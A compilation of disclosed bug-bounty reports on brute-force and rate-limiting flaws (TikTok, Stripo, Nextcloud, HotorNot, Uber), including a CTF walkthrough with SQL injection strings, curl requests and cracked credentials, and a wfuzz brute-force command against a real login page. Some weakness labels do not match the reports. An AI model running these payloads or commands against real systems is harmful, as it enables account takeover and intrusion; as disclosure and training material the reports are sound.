### [Lack of rate limitation on careers site allows the attacker to brute force the verification code](https://hackerone.com/reports/1075827)

- **Report ID:** `1075827`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** TikTok
- **Reporter:** @iambouali
- **Bounty:** - usd
- **Disclosed:** 2021-02-11T22:58:15.568Z
- **CVE(s):** -

**Summary (team):**

An attacker could have potentially attempted to brute force the verification code needed to reset a candidate's password by leveraging a lack of rate limiting on the TikTok careers portal. We thank @iambouali for reporting this to our team and confirming the resolution.

---

### [Grinch-Networks taken down - hacky holidays CTF ](https://hackerone.com/reports/1069189)

- **Report ID:** `1069189`
- **Severity:** Critical
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** h1-ctf
- **Reporter:** @pirateducky
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:06:08.809Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
CTF Submission

```
Day 1: flag{48104912-28b0-494a-9995-a203d1e261e7} 
Day 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} 
Day 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a} 
Day 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6} 
Day 5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004} 
Day 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395} 
Day 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd} 
Day 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Day 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Day 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
Day 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Day 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
```

{F1139188}

## Steps To Reproduce:

- Day 1: /robots.txt
- Day 2: /s3cr3t-ar3a
  - inspect html
  - the flag is dynamically built
- Day 3: /people-rater
  - [https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=](https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=)
- Day 4: /swag-shop
  - [https://hackyholidays.h1ctf.com/swag-shop/api/sessions](https://hackyholidays.h1ctf.com/swag-shop/api/sessions)
  - One of the sessions has a user value `C7DCCE-0E0DAB-B20226-FC92EA-1B9043` 
  - [https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043](https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043)
- Day 5:  Secure Login
  - bruteforce the username: `access` & password: `computer`
  - Edit the cookie to make ourselves admin
  - `/my_secure_files_not_for_you.zip` 
  - password for zip: hahahaha
  - {F1139213}
- Day 6: /my-diary/?template=entries.html
  - `/my-diary/?template=index.php` discloses the source
  - [ https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php]( https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php)
- Day 7: /hate-mail-generator
  -  `curl 'https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'preview_markup=Hello+%7B%7Bname%7D%7D+....&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22%2C%22email%22%3A%22alice%40test.com%22%7D'`
- Day 8: /forum
  - Github recon: search for "grinch-networks"
  - One username is found [https://github.com/Grinch-Networks](https://github.com/Grinch-Networks)
  - Commit history reveals password [here](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae)
  - Log into the [phpmyadmin](https://hackyholidays.h1ctf.com/forum/phpmyadmin) with username: `forum` & password: `6HgeAZ0qC9T6CQIqJpD`
  - Get username `grinch` & password `35D652126CA1706B59DB02C93E0C9FBF` which is a hash
  - Use [crackstation](https://crackstation.net/) to get the value `BahHumbug` 
  - Log into the forum with the username: `grinch` & password:`BahHumbug`
  - `curl 'https://hackyholidays.h1ctf.com/forum/3/2' -H 'Cookie: phpmyadmin=98ac2709d3d94e8ba1afefab300deb8e; token=9F315347A655FFDAF70CD4A3529EE8A6`
- Day 9: /evil-quiz
  - Second Order SQLi in `name` parameter
  - use a name like `hax" OR (select 1 from admin)#` to verify the existence of the `admin` table
  - use a name like `hax" OR (select count(password) from admin)#` to verify the column password
 - I decided to bruteforce the password
 - {F1139240} username: `admin` password: `S3creT_p4ssw0rd-$`
- Day 10 /signup-manager
  - [https://hackyholidays.h1ctf.com/signup-manager/README.md](https://hackyholidays.h1ctf.com/signup-manager/README.md) from html source
  - Download [https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip](https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip)
  - Source Code!
  - Need a username that gets us admin `username#password#cookie#age#firstname#lastname#Y` - note the `Y` at the end
  - If we submit a number that "expands" after being evaluated by `$age = intval($_POST["age"]);` we can "overflow" our `lastname` and end up with an admin account
  - `action=signup&username=1337&password=password&age=1e5&firstname=YYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYY` 
- Day 11: /r3c0n_server_4fdk59
  - SQLi insde more SQLi
  - There's a SQL injection in the hash param: `/r3c0n_server_4fdk59/album?hash=3dir42`
  - {F1139250} - script to bruteforce the username & password: `grinchadmin` : `s4nt4sucks`
  - `curl 'https://hackyholidays.h1ctf.com/attack-box' -H 'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687`
- Day 12: /attack-box
  - The only thing to try to attack is the hash inside the base64 encoded value that maps the target's ip address
  - Use `hashcat` with the hashes we have alongside some guesses for the salt and the ip addresses we have, our guesses will look like `hash:salt:ip`
  - Use some Christmas keywords like `santa, grinch` from wordlists
  - `5f2940d65ca4140cc18d0878bc398955:mrgrinch463:203.0.113.33` 
  - Now we can sign our payloads with the correct salt, but using `127.0.0.1` stops the attack
  - Use DNS rebinding! - [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)
  - `https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS43ZjAwMDAwMi5yYm5kci51cyIsImhhc2giOiI1MzE4NDcxODU0MDBhYjkzOWE5Yzc5NzA3NTAzOGIwYiJ9` 
- https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709

Thanks to everyone who put this together, it was a ton of fun & thanks to the people I asked questions to - ya'll are awesome.

## Impact

HUGE

---

### [A specially crafted value for the 'Cache-Digest' header causing crash in  chat.makerdao.com](https://hackerone.com/reports/972936)

- **Report ID:** `972936`
- **Severity:** Critical
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @lalit2020
- **Bounty:** - usd
- **Disclosed:** 2020-11-02T16:21:34.069Z
- **CVE(s):** CVE-2020-9490

**Summary (team):**

A specially crafted value for the 'Cache-Digest' header causing crash

---

### [[H1-2006 2020]  Includes 1 free content discovery](https://hackerone.com/reports/894198)

- **Report ID:** `894198`
- **Severity:** Critical
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** h1-ctf
- **Reporter:** @osintopsec
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:28:15.281Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Got it! Thanks guys for going through the trouble to make these. Best regards @nahamsec @adamtlangley @B3nac for hosting and @hackingfish @zonkism and @clos for peer support to make it.

Writeup to follow, but let's have the flag first!

{F859962}

## Impact

Participating in CTFs can cause sleepless nights, severe addiction and vastly great learning experiences. Handle with care. For remediation, it's advisable to host more CTFs in the near future. Remember to check out the writeups afterwards!

---

### [load scripts DOS vulnerability](https://hackerone.com/reports/826238)

- **Report ID:** `826238`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @th3cyb3rc0p
- **Bounty:** - usd
- **Disclosed:** 2020-04-02T19:19:55.057Z
- **CVE(s):** CVE-2018-6389

**Summary (team):**

load scripts DOS vulnerability

---

### [Authorization for wp-admin directory are vulnerable to brute force.](https://hackerone.com/reports/788420)

- **Report ID:** `788420`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Stripo Inc
- **Reporter:** @brumens
- **Bounty:** - usd
- **Disclosed:** 2020-02-05T15:40:31.375Z
- **CVE(s):** -

**Vulnerability Information:**

The domain https://my.stripo.email in the directory /wp-admin are not blocking amount of request in the authorization form, this leads to bruteforce attack. Where the attacker are able to guess tons of passwords without getting blocked or the password field gets locked.
This attack make it possible to gain access as an admin extremely easy and quick to get a successfully login.

To test this security issue you need to visit the link https://my.stripo.email in the directory /wp-admin
Install a bruteforce tool like: Burp intruder, Wfuzz, Hydra, Ncrack
I personality use Wfuzz and Burp.

Wfuzz command in Linux terminal: wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -u https://my.stripo.email/wp-admin -d "Authorization: Basic admin:FUZZ" 

Supported links and fix tips:
https://owasp.org/www-community/attacks/Brute_force_attack
https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks

This Pictures below show status from my program as you can see with Wfuzz it hitted around 3000 passwords in like 40 secounds (calculated approximately.)
My Burp suite shows more exact response from your server.

## Impact

Get access to anadmin login quickly and while logged in the attacker can do whatever an admin can.

---

### [Bruteforce in admin panel](https://hackerone.com/reports/341074)

- **Report ID:** `341074`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Nextcloud
- **Reporter:** @shawalkhan
- **Bounty:** - usd
- **Disclosed:** 2020-01-31T14:19:03.274Z
- **CVE(s):** -

**Vulnerability Information:**

Hello there,
Admin panel of your website (https://nextcloud.com/wp-login.php) is vulnerable to bruteforce attacks as their is no rate-limiting.

## Impact

Can gain access to admin panel.
To fix this, Just add rate limiting.

---

### [The login of Hotor Not is Vulnerable to bruteforce.](https://hackerone.com/reports/744692)

- **Report ID:** `744692`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Bumble
- **Reporter:** @oo7hacker3
- **Bounty:** - usd
- **Disclosed:** 2020-01-23T18:16:56.069Z
- **CVE(s):** -

**Vulnerability Information:**

I was able to validate that The Login of HotorNot is Vulnerable to BruteForcing .

Steps to reproduce:
1. https://hotornot.com/signin
2.Use Burp intruder attack for BruteForcing 
3.Send as many requests you want.

Fix:
Proper mitigation of BruteForcing should be done using Ratelimitng etc implementation.

## Impact

If attacker successfully Bruteforces the he/she might takeover it.Which might lead in users Privacy Violation

---

### [The Uber Promo Customer Endpoint Does Not Implement Multifactor Authentication, Blacklisting or Rate Limiting](https://hackerone.com/reports/293359)

- **Report ID:** `293359`
- **Severity:** High
- **Weakness:** Improper Restriction of Authentication Attempts
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-24T20:20:01.989Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The https://cn-sjc1.uber.com/rt/users/apply-clients-promotions customer endpoint used to apply Uber promotions does not implement multifactor authentication, IP address blacklisting for multiple failed attempts, or IP address-based rate limiting to prevent brute force bearer token enumeration.

## Security Impact
Issued x-uber-tokens are able to be enumerated at rates only limited by an attacker's available bandwidth.

## Reproduction Steps
A massively parallel Golang application was configured to spawn thousands of concurrent HTTP request workers, each with a PRNG-derived  token. Unlike other endpoints within the Uber architecture, https://cn-sjc1.uber.com/rt/users/apply-clients-promotions only requires an x-uber-token and promo code to assess whether the token and/or promo code is valid. By using a valid promo code in conjunction with a randomly-derived x-uber-token, more than a million brute force attempts at enumerating valid bearer tokens was able to be accomplished in a matter of minutes, without any type of IP address blacklisting or rate limiting controls preventing the attack. 

## Specifics
* No account was needed for this brute force enumeration attack against the https://cn-sjc1.uber.com/rt/users/apply-clients-promotions customer endpoint, only a valid promo code

## Impact

An attacker with sufficient bandwidth could enumerate valid x-uber-tokens at high rates of speed, in turn resulting in compromise of privileged account information and hijacking of user sessions associated with those x-uber-tokens.

---
